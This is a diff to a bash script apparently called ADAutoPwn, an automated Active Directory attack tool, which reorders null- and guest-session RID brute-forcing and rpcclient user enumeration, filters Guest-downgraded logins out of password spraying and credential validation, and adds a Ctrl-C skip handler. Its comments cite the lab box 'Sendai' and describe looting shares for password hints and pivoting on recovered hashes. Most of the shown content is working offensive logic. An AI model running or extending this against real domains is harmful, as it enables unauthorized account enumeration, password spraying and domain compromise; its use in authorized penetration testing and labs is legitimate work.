@@ -22,7 +22,7 @@ set -o pipefail
 # ===========================================================================
 #  METADATA
 # ===========================================================================
-readonly VERSION="1.39.0"
+readonly VERSION="1.40.0"
 readonly AUTHOR="c4sh3r"
 KERBRUTE_BIN="${KERBRUTE_BIN:-/opt/kerbrute}"
 
@@ -336,6 +336,14 @@ queue_cred() {  # queue_cred <user> <password|""> <nthash|""> [via-technique]
     local u="$1" p="$2" h="$3" via="${4:-pivot}"
     if ! _is_valid_identity "$u"; then
         [[ -n "$u" ]] && err "Ignoring implausible identity '$u' (looks like a path/filename)"
+        return
+    fi
+    # GUEST / anonymous is NOT a foothold. It authenticates with a blank password by
+    # design but has zero privileges — running the full per-identity assessment as
+    # Guest only spews LDAP "successful bind must be completed" errors, bloodyAD
+    # "-p required", and useless module tracebacks. It already did its job in the
+    # UNAUTHENTICATED phase (guest-session share/RID enum); never queue it as a pivot.
+    if [[ -z "$h" ]] && [[ "${u,,}" == "guest" || "${u,,}" == "anonymous" || "${u,,}" == "adautopwn" ]]; then
         return
     fi
     # Surface recovered NT hashes (the VALUE) for the final harvest — captured here
@@ -730,6 +738,42 @@ phase_unauth() {
     fi
     have smbmap && { run "smbmap -H $DC_IP -u null -p null"; smbmap -H "$DC_IP" -u null -p null 2>&1 | tee -a "$LOGFILE"; }
 
+    # USER ENUMERATION FIRST — it's cheap and, via a guest session, usually returns the
+    # full domain user list outright. Doing this BEFORE the (slow) share download means
+    # that when RID-brute succeeds we already hold every user and the share looting
+    # below is just for the password HINT, not a desperate hunt for usernames.
+    subsection "RID brute force (enumerate users without credentials)"
+    # A plain NULL session (-u '' -p '') is commonly DENIED on hardened DCs (Sendai
+    # returns LSAD STATUS_ACCESS_DENIED), but a GUEST session still allows SAMR RID
+    # cycling — ANY junk username with a blank password is mapped to Guest when guest
+    # access is enabled. Try null first, then guest/junk, and keep whichever returns
+    # users. (This is the exact reason `nxc -u test -p '' --rid-brute` works on Sendai
+    # while `-u ''` does not.)
+    local rb="" _pair _ru _rp _ridok=""
+    for _pair in "_NULL_ _NULL_" "guest _NULL_" "adautopwn _NULL_"; do
+        _ru="${_pair%% *}"; _rp="${_pair##* }"
+        [[ "$_ru" == "_NULL_" ]] && _ru=""; [[ "$_rp" == "_NULL_" ]] && _rp=""
+        run "$NXC smb $DC_IP -u '${_ru}' -p '${_rp}' --rid-brute 4000"
+        rb=$($NXC smb "$DC_IP" -u "$_ru" -p "$_rp" --rid-brute 4000 2>&1); echo "$rb" | tee -a "$LOGFILE"
+        echo "$rb" | grep -i 'SidTypeUser' | grep -oP '\\\K[^ ]+' | sort -u >"$OUTDIR/users_ridbrute.txt"
+        [[ -s "$OUTDIR/users_ridbrute.txt" ]] && { _ridok="$_ru"; break; }
+    done
+    if [[ -s "$OUTDIR/users_ridbrute.txt" ]]; then
+        [[ -n "$_ridok" ]] && loot "RID brute worked via GUEST session (-u '${_ridok}' -p '') — null session was denied"
+        loot "$(wc -l <"$OUTDIR/users_ridbrute.txt") users via RID brute → users_ridbrute.txt"
+        while read -r u; do echo -e "      ${C_GREEN}·${C_RESET} $u"; FOUND_USERS+=("$u"); done <"$OUTDIR/users_ridbrute.txt"
+    fi
+
+    subsection "rpcclient: enumdomusers (null / guest session)"
+    # Same null-vs-guest story: fall back to a guest session if the null one is denied.
+    for _pair in "-U '' -N" "-U 'guest%'" "-U 'adautopwn%'"; do
+        run "rpcclient $_pair $DC_IP -c enumdomusers"
+        eval "rpcclient $_pair \"$DC_IP\" -c 'enumdomusers' 2>&1" | tee -a "$LOGFILE" \
+            | grep -oP 'user:\[\K[^\]]+' | sort -u >"$OUTDIR/users_rpc.txt"
+        [[ -s "$OUTDIR/users_rpc.txt" ]] && break
+    done
+    [[ -s "$OUTDIR/users_rpc.txt" ]] && loot "Users via rpcclient → users_rpc.txt"
+
     # DOWNLOAD + harvest anonymously-readable shares. Listing isn't enough — the
     # weak-password hint that gives the foothold lives INSIDE these files (e.g.
     # Sendai's incident.txt). nxc's null spider is tried first; if it pulls nothing
@@ -785,9 +829,11 @@ phase_unauth() {
     # Usernames also hide as DIRECTORY NAMES in shares — per-user folders such as
     # transfer/<user>/, home/<user>/, profiles\<user>. These dirs are frequently
     # EMPTY (so the file download above pulls nothing), yet the folder name IS the AD
-    # username (first.last). This is exactly how Sendai leaks its users when RID-brute
-    # and RPC are denied. Mine them straight from a recursive share listing.
-    if have smbclient; then
+    # username (first.last). FALLBACK ONLY: skip it when RID-brute / rpcclient already
+    # enumerated the users (no point listing folders if we hold the real list) — it's
+    # the recovery path for when even the guest RID/SAMR enum is denied.
+    if [[ ! -s "$OUTDIR/users_ridbrute.txt" && ! -s "$OUTDIR/users_rpc.txt" ]] && have smbclient; then
+        info "RID-brute/RPC gave no users → mining usernames from share folder names (fallback)"
         local _dshl _ds; local -a _sca2; [[ -n "$ANON_U" ]] && _sca2=(-U "${ANON_U}%${ANON_P}") || _sca2=(-N)
         _dshl=$(smbclient -L "//$DC_IP" "${_sca2[@]}" 2>/dev/null | awk '/Disk/{print $1}')
         while IFS= read -r _ds; do
@@ -804,38 +850,6 @@ phase_unauth() {
         sort -u -o "$OUTDIR/users_anon.txt" "$OUTDIR/users_anon.txt"
         loot "$(grep -c . "$OUTDIR/users_anon.txt") candidate username(s) mined from share content + folder names → users_anon.txt"
     fi
-
-    subsection "RID brute force (enumerate users without credentials)"
-    # A plain NULL session (-u '' -p '') is commonly DENIED on hardened DCs (Sendai
-    # returns LSAD STATUS_ACCESS_DENIED), but a GUEST session still allows SAMR RID
-    # cycling — ANY junk username with a blank password is mapped to Guest when guest
-    # access is enabled. Try null first, then guest/junk, and keep whichever returns
-    # users. (This is the exact reason `nxc -u test -p '' --rid-brute` works on Sendai
-    # while `-u ''` does not.)
-    local rb="" _pair _ru _rp _ridok=""
-    for _pair in "_NULL_ _NULL_" "guest _NULL_" "adautopwn _NULL_"; do
-        _ru="${_pair%% *}"; _rp="${_pair##* }"
-        [[ "$_ru" == "_NULL_" ]] && _ru=""; [[ "$_rp" == "_NULL_" ]] && _rp=""
-        run "$NXC smb $DC_IP -u '${_ru}' -p '${_rp}' --rid-brute 4000"
-        rb=$($NXC smb "$DC_IP" -u "$_ru" -p "$_rp" --rid-brute 4000 2>&1); echo "$rb" | tee -a "$LOGFILE"
-        echo "$rb" | grep -i 'SidTypeUser' | grep -oP '\\\K[^ ]+' | sort -u >"$OUTDIR/users_ridbrute.txt"
-        [[ -s "$OUTDIR/users_ridbrute.txt" ]] && { _ridok="$_ru"; break; }
-    done
-    if [[ -s "$OUTDIR/users_ridbrute.txt" ]]; then
-        [[ -n "$_ridok" ]] && loot "RID brute worked via GUEST session (-u '${_ridok}' -p '') — null session was denied"
-        loot "$(wc -l <"$OUTDIR/users_ridbrute.txt") users via RID brute → users_ridbrute.txt"
-        while read -r u; do echo -e "      ${C_GREEN}·${C_RESET} $u"; FOUND_USERS+=("$u"); done <"$OUTDIR/users_ridbrute.txt"
-    fi
-
-    subsection "rpcclient: enumdomusers (null / guest session)"
-    # Same null-vs-guest story: fall back to a guest session if the null one is denied.
-    for _pair in "-U '' -N" "-U 'guest%'" "-U 'adautopwn%'"; do
-        run "rpcclient $_pair $DC_IP -c enumdomusers"
-        eval "rpcclient $_pair \"$DC_IP\" -c 'enumdomusers' 2>&1" | tee -a "$LOGFILE" \
-            | grep -oP 'user:\[\K[^\]]+' | sort -u >"$OUTDIR/users_rpc.txt"
-        [[ -s "$OUTDIR/users_rpc.txt" ]] && break
-    done
-    [[ -s "$OUTDIR/users_rpc.txt" ]] && loot "Users via rpcclient → users_rpc.txt"
 
     subsection "LDAP: anonymous bind"
     if [[ -n "$DOMAIN" ]]; then
@@ -1089,7 +1103,14 @@ phase_validate_creds() {
     run "$NXC smb $DCT ${args[*]}"
     local out; out=$($NXC smb "$DCT" "${args[@]}" 2>&1); echo "$out" | tee -a "$LOGFILE"
 
-    if echo "$out" | grep -q '\[+\]'; then
+    if echo "$out" | grep -qi '\[+\].*(Guest)'; then
+        # nxc tags a login that was DOWNGRADED to the Guest account with "(Guest)". When
+        # guest is enabled, ANY username + blank password "succeeds" as Guest — this is
+        # NOT a real credential for $USER (e.g. junk mined from text like safety.company).
+        warn "'${USER}' only authenticated AS GUEST (blank-password downgrade, not a real credential) → skipping"
+        note_cred_source "$USER" "guest-downgrade (not a real account)"
+        return
+    elif echo "$out" | grep -q '\[+\]'; then
         HAVE_AUTH=1
         ok "Valid credentials for ${C_BOLD}$USER${C_RESET}"
         if echo "$out" | grep -qiE '\(Pwn3d!\)|\(admin\)'; then
@@ -4363,7 +4384,14 @@ _seed_anon_weak_spray() {
         fi
         printf '%s\n' "$out" >>"$LOGFILE"
         while IFS= read -r line; do
+            # nxc tags a login that was DOWNGRADED to the Guest account with "(Guest)".
+            # When guest is enabled, ANY username + blank password "succeeds" as Guest —
+            # that's NOT a real credential for the named user (e.g. junk like
+            # safety.company mined from text). Skip those; keep only true blank-password
+            # accounts (a plain [+] with no (Guest)) and must-change ones.
+            grep -qi '(Guest)' <<<"$line" && continue
             u=$(grep -oP '\\\K[^\\:]+(?=:)' <<<"$line" | head -1); [[ -z "$u" ]] && continue
+            [[ "${u,,}" == "guest" || "${u,,}" == "anonymous" ]] && continue
             pw=""; [[ "$mode" == userpass ]] && pw="$u"
             if grep -qi 'STATUS_PASSWORD_MUST_CHANGE' <<<"$line"; then
                 loot "★ ${C_GREEN}${u}${C_RESET} — $lbl accepted but MUST-CHANGE → reset on pivot"
@@ -5914,7 +5942,24 @@ final_summary() {
 }
 
 _atexit() { [[ -n "$SUDO_KEEPALIVE_PID" ]] && kill "$SUDO_KEEPALIVE_PID" 2>/dev/null; }
-trap _atexit EXIT INT TERM
+
+# Ctrl-C = SKIP the current (possibly stuck) step and continue, instead of killing the
+# whole run — a single SIGINT interrupts the foreground command, the handler returns,
+# and the script moves on to the next step. Press Ctrl-C TWICE within 2s to actually
+# abort. This is what makes a hung nxc/evil-winrm/certipy call recoverable without
+# losing the whole assessment.
+_LAST_SIGINT=0
+_on_sigint() {
+    local now=${SECONDS:-0}
+    if (( now - _LAST_SIGINT <= 2 )) && (( _LAST_SIGINT > 0 )); then
+        printf '\n'; warn "Second Ctrl-C → aborting ADAutoPwn"
+        exit 130
+    fi
+    _LAST_SIGINT=$now
+    printf '\n'; warn "Ctrl-C → skipping current step (press Ctrl-C again within 2s to QUIT the whole run)"
+}
+trap _atexit EXIT TERM
+trap _on_sigint INT
 
 # ===========================================================================
 #  PIVOTING ENGINE  —  assess each credential, recurse on what it unlocks
